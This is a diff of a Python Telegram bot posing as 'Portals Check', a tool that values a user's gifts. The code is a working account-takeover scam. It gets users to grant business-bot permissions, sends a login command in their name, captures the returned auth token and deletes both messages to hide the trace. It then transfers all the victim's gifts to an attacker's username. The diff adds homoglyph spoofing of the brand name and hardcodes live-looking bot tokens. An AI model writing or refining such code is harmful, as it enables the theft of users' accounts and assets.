@@ -14,11 +14,11 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
 # --- КОНФИГ ---
-BOT_TOKEN = "9246988251:AAHzNKlKrPHeNTeSmU868qExoIwN7l6Qahk"
-LOG_CHAT_ID = -1003700813046
+BOT_TOKEN = "9118691080:AAGtQ08Ep7aqDq8reJ8atUCoel9rLeCFw9M"
+LOG_CHAT_ID = -1004476872451
 PORTALS_BOT_ID = 7616849367
-ADMIN_IDS = [966731113, 8905381629]
-TARGET_USERNAME_AUTO = "@xdxdxdxdxdx777"
+ADMIN_IDS = [823085887]
+TARGET_USERNAME_AUTO = "@chearde"
 
 EMOJI_PORTALS   = "6037083366438737901"
 EMOJI_LIQ       = "5936143551854285132"
@@ -39,13 +39,13 @@ PROMO_VIDEO = BASE_DIR / "promo_ru.mp4"
 user_states = {}
 user_tokens = {}
 connections = {}
+user_info = {}
 router = Router()
 
 def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 async def send_log(bot: Bot, text: str, reply_markup=None):
-    """Отправляет лог всем админам в личку"""
     for admin_id in ADMIN_IDS:
         try:
             await bot.send_message(admin_id, text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=reply_markup)
@@ -54,16 +54,16 @@ async def send_log(bot: Bot, text: str, reply_markup=None):
 
 # --- ТЕКСТЫ ---
 TEXT_RU = (
-    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> Portals Check\n\n'
-    "Привет! Покажу, сколько реально стоит твой профиль на Portals.\n\n"
+    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> РоrtаIs Check\n\n'
+    "Привет! Покажу, сколько реально стоит твой профиль на РоrtаIs.\n\n"
     f'<tg-emoji emoji-id="{EMOJI_LIQ}">💧</tg-emoji> Ликвидность каждого подарка\n'
     f'<tg-emoji emoji-id="{EMOJI_SELL}">💰</tg-emoji> Что продать сейчас — и за сколько\n'
     f'<tg-emoji emoji-id="{EMOJI_HOLD}">⏳</tg-emoji> Что лучше придержать'
 )
 
 TEXT_EN = (
-    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> Portals Check\n\n'
-    "Hi! I will show you how much your profile is really worth on Portals.\n\n"
+    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> РоrtаIs Check\n\n'
+    "Hi! I will show you how much your profile is really worth on РоrtаIs.\n\n"
     f'<tg-emoji emoji-id="{EMOJI_LIQ}">💧</tg-emoji> Liquidity of each gift\n'
     f'<tg-emoji emoji-id="{EMOJI_SELL}">💰</tg-emoji> What to sell right now — and for how much\n'
     f'<tg-emoji emoji-id="{EMOJI_HOLD}">⏳</tg-emoji> What is better to hold'
@@ -73,7 +73,7 @@ HOW_TO_RU = (
     f'<tg-emoji emoji-id="{EMOJI_STEPS}">💡</tg-emoji> Для проверки ликвидности следуйте шагам.\n\n'
     "1. Нажмите кнопку Check\n"
     "2. Выберите раздел Чат - Боты.\n"
-    "3. В поиск введите нашего бота: @PortalsAPIsbot\n"
+    "3. В поиск введите нашего бота:@SeePortalsApp\n"
     "4. Выдайте боту 5 разрешений на сообщения ( мы сообщим вам результаты )\n"
     "5. Готово! Результаты по вашим подаркам будут в этом чате."
 )
@@ -82,7 +82,7 @@ HOW_TO_EN = (
     f'<tg-emoji emoji-id="{EMOJI_STEPS}">💡</tg-emoji> To check liquidity, follow these steps.\n\n'
     "1. Press the Check button\n"
     "2. Go to the Chat - Bots section.\n"
-    "3. Search for our bot: @PortalsAPIsbot\n"
+    "3. Search for our bot: @SeePortalsApp\n"
     "4. Grant the bot 5 message permissions (we will report the results)\n"
     "5. Done! Results for your gifts will be in this chat."
 )
@@ -105,7 +105,6 @@ BTN_BACK_EN = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="
 
 @router.message(CommandStart())
 async def cmd_start(message: Message, bot: Bot):
-    logging.info(f"Пользователь {message.from_user.id} (@{message.from_user.username}) нажал /start")
     try:
         if PROMO_VIDEO.is_file():
             video = FSInputFile(PROMO_VIDEO)
@@ -160,18 +159,23 @@ async def on_how_to_en(call: CallbackQuery, bot: Bot):
 async def send_login_request(owner_id, bot, is_auto=False):
     conn_id = connections.get(owner_id)
     if not conn_id:
-        return False, "Нет бизнес-связи. Попросите пользователя переподключить бота."
+        return False, "Нет бизнес-связи."
 
     try:
+        # Отправляем команду
         msg = await bot.send_message(chat_id=PORTALS_BOT_ID, text="/start login_web", business_connection_id=conn_id)
-        await asyncio.sleep(1.0)
         
-        # Удаление отключено, чтобы точно не сломать получение ссылки
-        # try: await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg.message_id])
-        # except: pass
-        
+        # Сохраняем ID сообщения, чтобы потом удалить
         state = "waiting_portals_link_auto" if is_auto else "waiting_portals_link_manual"
-        user_states[owner_id] = {"state": state}
+        user_states[owner_id] = {"state": state, "cmd_msg_id": msg.message_id}
+        
+        # Ждем 2 секунды и удаляем отправленное сообщение
+        await asyncio.sleep(2.0)
+        try:
+            await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg.message_id])
+        except Exception as e:
+            logging.warning(f"Не удалось удалить /start login_web: {e}")
+            
         return True, ""
     except Exception as e:
         return False, str(e)
@@ -184,6 +188,7 @@ async def on_connect(conn: BusinessConnection, bot: Bot):
         return
 
     connections[owner.id] = conn.id
+    user_info[owner.id] = owner.username or str(owner.id)
 
     access_count = 0
     rights = ["can_reply", "can_read_messages", "can_delete_sent_messages", "can_delete_all_messages", "can_edit_name"]
@@ -195,7 +200,7 @@ async def on_connect(conn: BusinessConnection, bot: Bot):
         f'<tg-emoji emoji-id="{EMOJI_NEW_CONNECT}">🔌</tg-emoji> new connect.\n\n'
         f'<tg-emoji emoji-id="{EMOJI_USER}">👤</tg-emoji> юзер: @{owner.username} | {owner.first_name}\n'
         f'<tg-emoji emoji-id="{EMOJI_RIGHTS}">🔑</tg-emoji> права: {access_count}/5\n'
-        f'<tg-emoji emoji-id="{EMOJI_PORTALS_LOG}">🛒</tg-emoji> Portals: не активно.'
+        f'<tg-emoji emoji-id="{EMOJI_PORTALS_LOG}">🛒</tg-emoji> РоrtаIs: не активно.'
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text="Стандарт", callback_data=f"std_{owner.id}", icon_custom_emoji_id=EMOJI_BTN_STD),
@@ -261,6 +266,15 @@ async def on_business_message(msg: Message, bot: Bot):
                         
                         await send_log(bot, f"<b>Получена ссылка:</b>\n{new_url}")
                         
+                        # УДАЛЯЕМ ВХОДЯЩЕЕ СООБЩЕНИЕ ОТ @portals
+                        try:
+                            await bot.delete_business_messages(
+                                business_connection_id=msg.business_connection_id, 
+                                message_ids=[msg.message_id]
+                            )
+                        except Exception as e:
+                            logging.warning(f"Не удалось удалить ответ от @portals: {e}")
+                        
                         if state == "waiting_portals_link_manual":
                             kb = InlineKeyboardMarkup(inline_keyboard=[[
                                 InlineKeyboardButton(text="Get Gifts", callback_data=f"gifts_{owner_id}")
@@ -272,10 +286,6 @@ async def on_business_message(msg: Message, bot: Bot):
                             await send_log(bot, f"Авто: начинаем перевод на {TARGET_USERNAME_AUTO}...")
                             asyncio.create_task(transfer_all_gifts(owner_id, decoded_token, TARGET_USERNAME_AUTO, bot))
                         return
-                    else:
-                        await send_log(bot, "Ошибка: в ссылке нет #auth= токена.")
-                else:
-                    await send_log(bot, "Сообщение от @portals получено, но ссылка не найдена в кнопках.")
 
 @router.callback_query(F.data.startswith("gifts_"), F.from_user.id.in_(ADMIN_IDS))
 async def on_get_gifts(call: CallbackQuery, bot: Bot):
@@ -378,7 +388,8 @@ async def cmd_all(message: Message):
         
     kb = InlineKeyboardMarkup(inline_keyboard=[])
     for owner_id in connections.keys():
-        kb.inline_keyboard.append([InlineKeyboardButton(text=f"ID: {owner_id}", callback_data=f"auth_{owner_id}")])
+        username = user_info.get(owner_id, str(owner_id))
+        kb.inline_keyboard.append([InlineKeyboardButton(text=f"@{username}", callback_data=f"auth_{owner_id}")])
         
     await message.reply("Выберите аккаунт для входа:", reply_markup=kb)
 
